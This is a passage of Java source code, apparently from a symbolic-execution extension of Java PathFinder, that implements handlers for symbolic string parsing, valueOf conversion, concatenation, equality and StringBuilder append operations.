					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISBOOLEAN, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Boolean Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTBOOLEAN, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Boolean Format Type Exception""); 
						// TODO: to review; there should be no backtracking here
						//th.getVM().getSystemState().setIgnored(true);
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseIntValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Integer Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISINTEGER, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Integer Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTINTEGER, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Integer Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseInt(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			IntegerExpression result = null;
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;
			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;

			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISINTEGER, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					result = ((StringExpression) sym_v3)._IvalueOf();
					sf.push(0, false); /* Result is don't care and an int */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(result);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTINTEGER, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					th.createAndThrowException(""java.lang.NumberFormatException"");
//					throw new RuntimeException(""ERROR: Integer Format Type Exception"");
//					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
//					//sf.push(0, true);
				}
			}
		}

	}

	public void handleParseFloat(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			RealExpression result = null;
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;
			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;
			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISFLOAT, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					result = ((StringExpression) sym_v3)._RvalueOf();
					sf.push(0, false); /* Result is don't care and a float */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(result);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTFLOAT, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					throw new RuntimeException(""ERROR: Possible Float Format Type Exception - Path Terminated"");
					
					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
				}
			}
		}

	}

	public void handleParseFloatValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Float Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				RealExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;
				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;
				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISFLOAT, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._RvalueOf();
						int objRef = getNewObjRef(invInst, th); /* dummy Float Object */
						sf.push(objRef, true);
						sf = th.getModifiableTopFrame();
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTFLOAT, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Possible Float Format Type Exception - Path Terminated"");
						
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}

	}

	public void handleParseDoubleValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.popLong();
				int objRef = getNewObjRef(invInst, th); /* dummy Double Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				RealExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;
				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISDOUBLE, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._RvalueOf();
						int objRef = getNewObjRef(invInst, th); /* dummy Double Object */
						sf.push(objRef, true);
						sf = th.getModifiableTopFrame();
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTDOUBLE, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Double Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);
						//sf.push(0, true); // TODO: to review
					}
				}
			}
		}

	}

	public void handleParseDouble(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				return;
			} else {
				StringExpression sym_v1 = (StringExpression) sym_v3;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISDOUBLE, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						RealExpression sym_v2 = new SpecialRealExpression(sym_v1);
						sf.pushLong((long) 0); /* Result is don't care and 0 */
						//sf = th.getModifiableTopFrame(); ??
						sf.setLongOperandAttr(sym_v2);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTDOUBLE, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Double Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}
	}

	public void handleParseLong(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				return;
			} else {
				StringExpression sym_v1 = (StringExpression) sym_v3;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISLONG, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						IntegerExpression sym_v2 = new SpecialIntegerExpression(sym_v1);
						sf.pushLong((long) 0); /* result is don't care */
						//sf = th.getModifiableTopFrame(); ??
						sf.setLongOperandAttr(sym_v2);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTLONG, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Long Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}
	}

	public void handleParseBoolean(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
			sf.pop();
			PathCondition pc;

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;

			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISBOOLEAN, sym_v1);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					IntegerExpression sym_v2 = new SpecialIntegerExpression(sym_v1);
					sf.push(0, false); /* result is don't care and 0 */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(sym_v2);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTBOOLEAN, sym_v1);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					throw new RuntimeException(""ERROR: Boolean Format Type Exception"");
					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
				}
			}
		}
	}

	public int getNewObjRef(JVMInvokeInstruction invInst, ThreadInfo th) {
		
		//DynamicArea da = th.getVM().getDynamicArea();
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = ClassLoaderInfo.getCurrentResolvedClassInfo(mi.getReturnTypeName());
		ElementInfo objRef = th.getHeap().newObject(ci, th);
		return objRef.getObjectRef();
	}

	// works for BigDecimal
	public Instruction getBigDecimalValue(JVMInvokeInstruction invInst, ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = mi.getClassInfo();
		MethodInfo miInit = ci.getMethod(""toString()V"", false);
		if (miInit == null) {
			return null;
		}
		//Instruction initPC = miInit.execute(th);
		//return initPC;
		throw new RuntimeException(""not handled; to review"");
	}

	// works for String, StringBuilder, StringBuffer
	public Instruction init1NewStringObjRef(JVMInvokeInstruction invInst, ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = mi.getClassInfo();
		MethodInfo miInit = ci.getMethod(""<init>()V"", false);
		if (miInit == null) {
			return null;
		}
		//Instruction initPC = miInit.execute(th); // TODO: to review
		//return initPC;
		throw new RuntimeException(""not handled; to review"");
	}

	public Instruction handleIntValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleIntValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); 
			/*
			 * dummy
			 * string
			 * Object
			 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleFloatValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		RealExpression sym_v1 = (RealExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleFloatValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleLongValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleLongValueOf"");
		} else {
			sf.popLong();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleDoubleValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		RealExpression sym_v1 = (RealExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleDoubleValueOf"");
		} else {
			sf.popLong();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleBooleanValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleBooleanValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleCharValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - CharValueOf"");
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleIntValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef();
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}

		return null;
	}

	public Instruction handleCharArrayValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		throw new RuntimeException(""ERROR: symbolic string method not Implemented - CharArrayValueof"");
	}

	public Instruction handleObjectValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v1 = (Expression) sf.getOperandAttr(0);
		if (sym_v1 instanceof SymbolicStringBuilder) {
			sf.pop();
			SymbolicStringBuilder sym_v3 = (SymbolicStringBuilder) sym_v1;
			StringExpression sym_v2 = StringExpression._valueOf((StringExpression) sym_v3.getstr());
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		} else if (sym_v1 instanceof StringExpression) {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf((StringExpression) sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		} else {
			throw new RuntimeException(""ERROR: symbolic string method not Implemented - ObjectValueof"");
		}
		return null;
	}

	public Instruction handleConcat(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleConcat"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = e1.asString();
				result = sym_v2._concat(val);
			} else if (sym_v2 == null) { // operand 1 is concrete
				ElementInfo e2 = th.getElementInfo(s2);
				String val = e2.asString();
				sym_v2 = new StringConstant(val);
				result = sym_v2._concat(sym_v1);
			} else { // both operands are symbolic
				result = sym_v2._concat(sym_v1);
			}
			int objRef = th.getHeap().newString("""", th).getObjectRef(); 
			/*
			* dummy
			* String
			* Object
			*/
			sf.push(objRef, true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public void handleObjectEquals(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v1 = (Expression) sf.getOperandAttr(0);
		Expression sym_v2 = (Expression) sf.getOperandAttr(1);

		if (sym_v1 != null) {
			// System.out.println(""*"" + sym_v1.toString());
			if (!(sym_v1 instanceof StringExpression)) {
				throw new RuntimeException(""ERROR: expressiontype not handled: ObjectEquals"");
			}
		}

		if (sym_v2 != null) {
			// System.out.println(""***"" + sym_v2.toString());
			if (!(sym_v2 instanceof StringExpression)) {
				throw new RuntimeException(""ERROR: expressiontype not handled: ObjectEquals"");
			}
		}

		handleEquals(invInst, th);
	}

	public void handleEquals(JVMInvokeInstruction invInst,  ThreadInfo th) {
		handleBooleanStringInstructions(invInst,  th, StringComparator.EQUALS);
		
	}

	public Instruction handleAppend(JVMInvokeInstruction invInst, ThreadInfo th) {
		Instruction handled = null;
		
		MethodInfo mi = invInst.getInvokedMethod(th);
		String[] argTypes = mi.getArgumentTypeNames();
		// System.out.println(argTypes[0]);
		
		boolean isCharSequence = false;
		//check what is the concrete type of the charsequence
		if(argTypes[0].equals(""java.lang.CharSequence"")) {
			isCharSequence = true;
			StackFrame sf = th.getModifiableTopFrame();
			int firstParamIndex = mi.isStatic() ? 0 : 1;
			Object firstParam = sf.getArgumentAttrs(mi)[firstParamIndex]; 
			if(firstParam instanceof StringExpression || firstParam == null /*possibly an string constant*/) {
				argTypes[0] = ""java.lang.String"";
			} else if (firstParam instanceof SymbolicStringBuilder) {
				//TODO and if it is a StringBuffer?
				argTypes[0] = ""java.lang.StringBuilder""; 
			} else {
				throw new RuntimeException(""Unhandled CharSequence at Symbolic String Append; concrete type is:"" + firstParam.getClass());
			}
		}
		if (isCharSequence && argTypes.length == 3) { //append(charSequence,int,int)
			if(argTypes[0].equals(""java.lang.String"")) {
				handled = handleStringAppend3(invInst, th);
			} else { //stringbuilder
				handled = handleStringBuilderAppend3(invInst, th);
			}
		} else if (argTypes[0].equals(""java.lang.String"")) {
			handleStringAppend(invInst, th);
		} else if ((argTypes[0].equals(""java.lang.StringBuilder"")) || (argTypes[0].equals(""java.lang.StringBuffer""))) {
			handleStringBuilderAppend(invInst, th);
		} else if (argTypes[0].equals(""int"")) {
			handleIntAppend(invInst, th);
		} else if (argTypes[0].equals(""char"")) {
			handleCharAppend(invInst, th);
		} else if (argTypes[0].equals(""byte"")) {
			handleByteAppend(invInst, th);
		} else if (argTypes[0].equals(""short"")) {
			handleShortAppend(invInst, th);
		} else if (argTypes[0].equals(""float"")) {
			handleFloatAppend(invInst, th);
		} else if (argTypes[0].equals(""long"")) {
			handleLongAppend(invInst, th);
		} else if (argTypes[0].equals(""double"")) {
			handleDoubleAppend(invInst, th);
		} else if (argTypes[0].equals(""boolean"")) {
			handleBooleanAppend(invInst, th);
		} else if (argTypes[0].equals(""java.lang.Object"")) {
			handleObjectAppend(invInst, th);
		} else {
			throw new RuntimeException(""ERROR: Input parameter type not handled in Symbolic String Append"");
		}

		return handled;
	}

	public void handleStringAppend(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		// int objRef = sf.getThis();
		// ElementInfo ei = th.getElementInfo(objRef);

		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleStringAppend"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			if (sym_v1 == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = e1.asString();
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				// setVariableAttribute(ei, invInst, th, sf, s2, sym_v2); //set the
				// value of the attribute of local StringBuilder element as sym_v2
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}
	
	public Instruction handleStringAppend3(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		
		IntegerExpression sym_end = (IntegerExpression) sf.getOperandAttr(0);
		IntegerExpression sym_start = (IntegerExpression) sf.getOperandAttr(1);
		StringExpression sym_string = (StringExpression) sf.getOperandAttr(2);
		SymbolicStringBuilder sym_builder = (SymbolicStringBuilder) sf.getOperandAttr(3);

		if (sym_builder == null) {
			sym_builder = new SymbolicStringBuilder();
		}
		
		//check if all parameters are concrete
		boolean concreteSubstring = (sym_end == null & sym_start == null & sym_string == null);
		
		if (concreteSubstring & sym_builder.getstr() == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleStringAppend3"");
		} else {
			int endRef = sf.pop();
			int startRef = sf.pop();
			int stringRef = sf.pop();
			int builderRef = sf.pop();
	
			//prepare the substring
			StringExpression substring;
			if(concreteSubstring) {
				try {
					ElementInfo eiString = th.getElementInfo(stringRef);
					String concreteString = eiString.asString();
					String slice = concreteString.substring(startRef, endRef);
					substring = new StringConstant(slice);
				} catch (IndexOutOfBoundsException e) {
					return th.createAndThrowException(""java.lang.IndexOutOfBoundsException"",e.getMessage());
				}
			} else {
				if(sym_string == null) { 
					ElementInfo eString = th.getElementInfo(stringRef);
					String concreteString = eString.asString();
					sym_string = new StringConstant(concreteString);
				}
				substring = createSymbolicSubstring(sym_string, sym_start, sym_end, startRef, endRef);
			}
			
			//append to the symbolic string
			if(sym_builder.getstr() == null) { //stringbuilder is concrete 
				ElementInfo eiBuilder = th.getElementInfo(builderRef);
				String builderContents = getStringEquiv(eiBuilder);
				sym_builder.putstr(new StringConstant(builderContents));
			}
			
			sym_builder._append(substring);
			sf.push(builderRef,true); 
		}
		
		sf.setOperandAttr(sym_builder);
		
		return null;
	}
	
	//helper
	private StringExpression createSymbolicSubstring(StringExpression sym_str,
			IntegerExpression sym_start, IntegerExpression sym_end,
			int startRef, int endRef) {
		
		StringExpression result;
		
		//'end' is the first parameter (something with stack representation, maybe?) 
		if(sym_start == null && sym_end == null) { 
			result = sym_str._subString(endRef, startRef);
		} else if (sym_start == null) {
			result = sym_str._subString(sym_end, startRef);
		} else { //sym_end == null
			result = sym_str._subString(endRef, sym_start);
		}
		
		return result;
	}
	
